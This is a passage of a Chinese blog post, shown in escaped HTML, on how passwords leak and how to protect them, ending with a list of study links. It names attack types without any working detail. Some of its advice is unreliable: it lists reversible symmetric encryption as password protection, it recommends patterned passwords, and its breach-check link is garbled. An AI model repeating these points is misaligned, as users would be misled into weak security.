从可信的源下载安装软件&lt;/li&gt;
&lt;li&gt;传输过程泄露&lt;br&gt;
在一个不可靠的网络环境下，黑客可以使用 Wireshark 这样的工具包拦截请求包，直接可以看到密码&lt;/li&gt;
&lt;/ul&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
&lt;p&gt;建议：&lt;br&gt;
不适用不可信的 WiFi 网络，特别是公共场合陌生、免费的 WiFi&lt;br&gt;
 非加密传输&lt;br&gt;
 http/https 协议，后者传输过程是加密的，如果有人拦截了数据请求包，也无法获知传输的是什么内容&lt;br&gt;
建议：&lt;br&gt;
尽量使用 SSl 加密&lt;br&gt;
保持浏览器在最新版本&lt;br&gt;
检查网络证书是否可信&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务端泄露&lt;br&gt;
建议：&lt;br&gt;
密码位数不宜过短过简单&lt;br&gt;
密码采用数字 + 大小写 + 特殊符号组成&lt;br&gt;
设置有自己规律的密码&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;攻击方法&#34;&gt; 攻击方法&lt;/span&gt;&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;木马、键盘记录、钓鱼、（拖库、洗库、撞库）&lt;/li&gt;
&lt;li&gt;恶意木马 / 恶意植入 / 键盘监听 / 伪造 / 不可信的 WiFi 网络 / 网络证书不可信 / 密码位数过短过简单 /&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;防御以及缓解措施&#34;&gt; 防御以及缓解措施&lt;/span&gt;&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;http://xn--haveibeenpwned-4x97a.com/%E6%9F%A5%E7%9C%8B%E5%AF%86%E7%A0%81%E6%98%AF%E5%90%A6%E6%B3%84%E9%9C%B2&#34;&gt;用 haveibeenpwned.com/ 查看密码是否泄露&lt;/a&gt; （未泄露绿色、泄露红色）&lt;/li&gt;
&lt;li&gt;利用 1Password、LastPass、Bitwarden 之类的密码管理器来保存密码。密码管理器可以注册时自动创建高强度无规律的密码，将其安全的存储在加密的保管库中，并在需要时自动填写密码。&lt;/li&gt;
&lt;li&gt;用户密码加密：对称加密算法（3DES、AES）&lt;br&gt;
明文密码 ----- 对称加密 ------- 密文密码&lt;br&gt;
密文密码 ----- 对称解密 ------- 明文密码&lt;/li&gt;
&lt;li&gt;使用 MD、SHA1 等单项 HASH 算法保护密码&lt;br&gt;
优点：使用这些算法后，没有办法通过算法还原出原始密码，实现简单，很多互联网公司喜欢用这种方式保存用户密码&lt;br&gt;
缺点：彩虹表技术可以进行查表破解，目前这种方式已经很不安全&lt;br&gt;
明文密码 ------HASH------- 密文密码&lt;br&gt;
密文密码不能解密密文密码&lt;/li&gt;
&lt;li&gt;特殊的单项 HASH 算法（加了 “固定盐” 的 HASH 算法）&lt;br&gt;
缺点：泄露了盐之后，用彩虹表技术也可以破解，只是增加了破解时间&lt;/li&gt;
&lt;li&gt;PBKDF2 算法：HASH 算法上增加 “随机盐”，并且进行多次 HASH 算法&lt;br&gt;
优点：“随机盐” 使彩虹表的建表难度大幅度增加，多次 HASH 也同样使得建表和破解的难度大幅度增加，该算法是美国国家标准与技术研究院推荐使用的算法&lt;/li&gt;
&lt;li&gt;使用一些高级算法保护密码可以有效低于彩虹表的攻击，即使数据泄露，最关键的 “用户密码” 仍然可以得到保护，切断撞库扫库的根源&lt;/li&gt;
&lt;li&gt;根据不同的 App 类型设置密码等级&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;学习&#34;&gt; 学习&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;资源&lt;br&gt;
&lt;a href=&#34;https://imbajin.com/about/&#34;&gt; https://imbajin.com/about/&lt;/a&gt;  (jin 学长)&lt;br&gt;
&lt;a href=&#34;https://www.hyominn00.top/&#34;&gt;https://www.hyominn00.top/&lt;/a&gt;  (何茜悦学姐)&lt;br&gt;
 奇项东：多看博客，写博客不是目的，是为了加深你对知识的理解&lt;br&gt;
尹俊：掘金&lt;br&gt;
